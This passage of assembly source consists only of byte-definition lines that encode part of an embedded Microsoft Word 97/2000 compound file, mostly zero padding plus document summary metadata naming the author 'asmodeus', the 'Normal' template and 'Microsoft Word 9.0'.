    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 089h, 005h, 089h, 005h, 0b4h, 000h
    db 0b4h, 000h, 081h, 081h, 012h, 030h, 000h, 000h, 011h, 000h, 019h, 000h
    db 064h, 000h, 000h, 000h, 019h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 002h, 000h, 000h, 000h, 0b9h, 001h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0f0h, 010h, 000h, 008h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 012h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 008h, 000h, 061h, 000h, 073h, 000h, 06dh, 000h, 06fh, 000h, 064h, 000h
    db 065h, 000h, 075h, 000h, 073h, 000h, 008h, 000h, 061h, 000h, 073h, 000h
    db 06dh, 000h, 06fh, 000h, 064h, 000h, 065h, 000h, 075h, 000h, 073h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 0feh, 0ffh, 000h, 000h, 005h, 000h, 002h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 0e0h, 085h, 09fh, 0f2h
    db 0f9h, 04fh, 068h, 010h, 0abh, 091h, 008h, 000h, 02bh, 027h, 0b3h, 0d9h
    db 030h, 000h, 000h, 000h, 06ch, 001h, 000h, 000h, 011h, 000h, 000h, 000h
    db 001h, 000h, 000h, 000h, 090h, 000h, 000h, 000h, 002h, 000h, 000h, 000h
    db 098h, 000h, 000h, 000h, 003h, 000h, 000h, 000h, 0a4h, 000h, 000h, 000h
    db 004h, 000h, 000h, 000h, 0b0h, 000h, 000h, 000h, 005h, 000h, 000h, 000h
    db 0c4h, 000h, 000h, 000h, 006h, 000h, 000h, 000h, 0d0h, 000h, 000h, 000h
    db 007h, 000h, 000h, 000h, 0dch, 000h, 000h, 000h, 008h, 000h, 000h, 000h
    db 0ech, 000h, 000h, 000h, 009h, 000h, 000h, 000h, 000h, 001h, 000h, 000h
    db 012h, 000h, 000h, 000h, 00ch, 001h, 000h, 000h, 00ah, 000h, 000h, 000h
    db 028h, 001h, 000h, 000h, 00ch, 000h, 000h, 000h, 034h, 001h, 000h, 000h
    db 00dh, 000h, 000h, 000h, 040h, 001h, 000h, 000h, 00eh, 000h, 000h, 000h
    db 04ch, 001h, 000h, 000h, 00fh, 000h, 000h, 000h, 054h, 001h, 000h, 000h
    db 010h, 000h, 000h, 000h, 05ch, 001h, 000h, 000h, 013h, 000h, 000h, 000h
    db 064h, 001h, 000h, 000h, 002h, 000h, 000h, 000h, 0e4h, 004h, 000h, 000h
    db 01eh, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 000h, 000h, 073h, 000h
    db 01eh, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 000h, 000h, 073h, 000h
    db 01eh, 000h, 000h, 000h, 009h, 000h, 000h, 000h, 061h, 073h, 06dh, 06fh
    db 064h, 065h, 075h, 073h, 000h, 000h, 020h, 000h, 01eh, 000h, 000h, 000h
    db 001h, 000h, 000h, 000h, 000h, 073h, 06dh, 06fh, 01eh, 000h, 000h, 000h
    db 001h, 000h, 000h, 000h, 000h, 073h, 06dh, 06fh, 01eh, 000h, 000h, 000h
    db 007h, 000h, 000h, 000h, 04eh, 06fh, 072h, 06dh, 061h, 06ch, 000h, 073h
    db 01eh, 000h, 000h, 000h, 009h, 000h, 000h, 000h, 061h, 073h, 06dh, 06fh
    db 064h, 065h, 075h, 073h, 000h, 000h, 020h, 000h, 01eh, 000h, 000h, 000h
    db 002h, 000h, 000h, 000h, 031h, 000h, 06dh, 06fh, 01eh, 000h, 000h, 000h
    db 013h, 000h, 000h, 000h, 04dh, 069h, 063h, 072h, 06fh, 073h, 06fh, 066h
    db 074h, 020h, 057h, 06fh, 072h, 064h, 020h, 039h, 02eh, 030h, 000h, 000h
    db 040h, 000h, 000h, 000h, 000h, 046h, 0c3h, 023h, 000h, 000h, 000h, 000h
    db 040h, 000h, 000h, 000h, 000h, 074h, 09eh, 08ah, 065h, 0b4h, 0bfh, 001h
    db 040h, 000h, 000h, 000h, 000h, 0bah, 061h, 0aeh, 065h, 0b4h, 0bfh, 001h
    db 003h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 003h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 003h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 003h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
